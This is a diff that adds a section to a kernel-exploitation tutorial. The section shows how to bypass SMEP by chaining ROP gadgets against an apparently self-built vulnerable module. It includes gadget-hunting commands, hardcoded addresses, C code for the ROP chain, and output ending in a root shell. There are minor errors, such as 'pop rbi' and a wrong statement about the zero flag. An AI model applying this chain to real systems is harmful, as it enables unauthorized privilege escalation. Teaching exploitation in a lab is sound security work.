@@ -23,6 +23,7 @@
 	 * [PTI bug](#pti-bug)
 * [Bypassing SMEP](#bypassing-smep)  
 	 * [ROP gadgets](#rop-gadgets)  
+	 * [ROP chaining](#rop-chaining)
 
 ## Creating the enviornment and the first kernel module
 
@@ -647,4 +648,108 @@ Now the exploit works as it is supposed to.
 
 ## Bypassing SMEP  
 ### ROP gadgets  
-If we enable `SMEP`, we won't be able to execute code in userland pages while operating in kernel mode. One way to bypass that is by using return oriented programming. 
+If we enable `SMEP`, we won't be able to execute code in userland pages while operating in kernel mode. If we remove `nosmep` from the append flag, and add `-cpu kvm64,+smep` to the boot script, we can try it by running the previous exploit:  
+```
+# ./ret2user
+...
+[+] Sending payload...
+[   41.406885] Stack write
+[   41.408142] unable to execute userspace code (SMEP?) (uid: 1000)
+[   41.410915] BUG: unable to handle page fault for address: 0000000000401de5
+[   41.414004] #PF: supervisor instruction fetch in kernel mode
+[   41.415690] #PF: error_code(0x0011) - permissions violation
+[   41.417369] PGD 4502067 P4D 4502067 PUD 452b067 PMD 444d067 PTE 2dfd025
+[   41.419128] Oops: 0011 [#1] SMP NOPTI
+[   41.420045] CPU: 0 PID: 147 Comm: ret2user Tainted: G           O      5.11.0 #3
+...
+Killed
+```  
+One way to bypass this is using return orientet programming (ROP). During this we search for ROP gadgets in the linux kernel, which are small assembly instructions followed by `ret` instructions. If we make a stack overflow, and we put the right addressess and contents in the right order on the stack, we will be able to do the same function as we used in the previous exploit.  
+First step to this is to find ROP gadgets. We can find these using a python tool called `ROPgadget`. We can run it on the linux kernel, save it in a txt and then analyze the possible gadgets.  
+```
+ROPgadget --binary vmlinux > gadgets.txt
+```  
+### ROP chaining  
+So, what do we need to do? We need to make the same thing as we did in the `privesc()` function before. We need to call `prepare_kernel_cred` with an argument of 0, then pass it to `commit_creds`. We see this in assembly in the privesc function, something like this:  
+```assembly
+movabs rax, 0xffffffff8108c240  ;prepare_kernel_cred 
+xor rdi, rdi 			;0 as parameter
+call rax 			;calling prepare_kernel_cred
+mov rdi, rax			;setting the return to the parameter of commit_creds
+movabs rax, 0xffffffff8108be00	;commit_creds
+call rax			;calling commit_creds
+```  
+So we need to find gadgets, to do this code. We can make it a little simpler right now. As we know, ROP is based on gadgets ending with ret. That means instead off calling these functions, we can simply put them on the stack, and by ret we will return into these functions. As for the parameters, that is the tricky question. For `prepare_kernel_cred` we need to pass 0 within the `rdi` register. We could search for gadgets, that does this with xor or mov, but these are almost never by themselves, they usually have some instructions after that. It is much easier, if put this 0 on the stack, and with a `pop rbi` instruction we put this 0 into rbi. Let's find that gadget:  
+```
+cat gadgets.txt | grep ': pop rbi; ret'
+...
+0xffffffff81001568 : pop rdi ; ret
+...
+``` 
+Cool. We found a perfect gadget for this. Let's save this into a variable we can use later:  
+```c
+unsigned long pop_rdi_ret = 0xffffffff81001568; // pop rdi; ret;
+```  
+Now we are done with `prepare_kernel_cred`, now we need to move the pointer this function returned into `rax`, and put it into `rdi` to use it as an argument of `commit_creds`. Well, there aren't many mov gadgets, that move content from rdi, to rax, at least not by themselves. We need to be a bit tricky.  
+If we look for a gadget for this, we can find the following gadget:  
+```
+0xffffffff813e52e4 : mov rdi, rax ; jne 0xffffffff813e52d1 ; xor eax, eax ; ret
+```  
+It does what we need, but that `jne` instruction makes it a bit harder to use. A good way to bypass this is to use a gadget, to set the zero flag to 0. To do this, we need a gadget, that for example compares a register to a number. Here is an example:  
+```
+0xffffffff81aa2871 : cmp rdx, 8 ; jne 0xffffffff81aa284e ; ret
+```  
+So if we set rdx to 8, we can set the zero flag to 0, and bypass both `jne` instructions. We can use the stack again:  
+```
+0xffffffff8101c946 : pop rdx ; ret
+```  
+So we need to put the 8 on the stack with the payload, and we will be able to bypass this jne instruction, thus doing the privilege escalation. This is how this part looks like in the exploit:  
+```c
+msg[off++] = stack_cookie;
+msg[off++] = dummy;
+msg[off++] = pop_rdi_ret; 		// pop rdi; ret;
+msg[off++] = 0; 			// to rdi
+msg[off++] = prepare_kernel_cred;
+msg[off++] = pop_rdx_ret; 		// pop rdx; ret;
+msg[off++] = 8; 			// to rdx
+msg[off++] = cmp_rdx_8_jne_ret; 	// cmp rdx, 8; jne; ret;
+msg[off++] = mov_rdi_rax_jne_xor_ret; 	// mov rdi, rax; jne; xor eax, eax; ret;
+msg[off++] = commit_creds;
+```  
+Now for the `swapgs` and `iretq`. We can easily find a `swapgs` gadget, but we need some trial and error until we find a working one. But I didn't find any `iretq` instructions between the rop gadgets. So I needed to search for it by hand. I used objdump for this:  
+```
+objdump -j .text -d vmlinux | grep iretq
+ffffffff810261db:       48 cf                   iretq  
+ffffffff810264ea:       48 cf                   iretq  
+ffffffff81037752:       48 cf                   iretq
+...
+```  
+There are many possibilities, but is used the first one. We don't need ret, because by setting back the user rip register, we will land wherever we want to set it. Now, it is the same as in the previous exploit. Now, we only need to pass the arguments of `iretq` on the stack, and we are done with the rop chain:  
+```c
+msg[off++] = swapgs_nop3_xor_ret; // swapgs; ret;
+msg[off++] = iretq;
+msg[off++] = user_rip;
+msg[off++] = user_cs;
+msg[off++] = user_rflags;
+msg[off++] = user_sp;
+msg[off++] = user_ss;
+```  
+If we try this exploit:  
+```
+# id
+uid=1000(user) gid=1000 groups=1000
+# ./smep 
+[+] Opening device file...
+[+] Trying to read from kernel stack...
+[ 2718.524810] Stack read
+[+] Received message
+[+] Stack cookie: 0x6e71976933e1fa00
+[+] Saving state...
+[+] Sending payload...
+[ 2718.528584] Stack write
+[+] Returned to userland, spawning root shell...
+[+] Privilege level successfully escalated, spawning shell...
+/home/user # id
+uid=0(root) gid=0(root)
+```  
+A root shell again!  
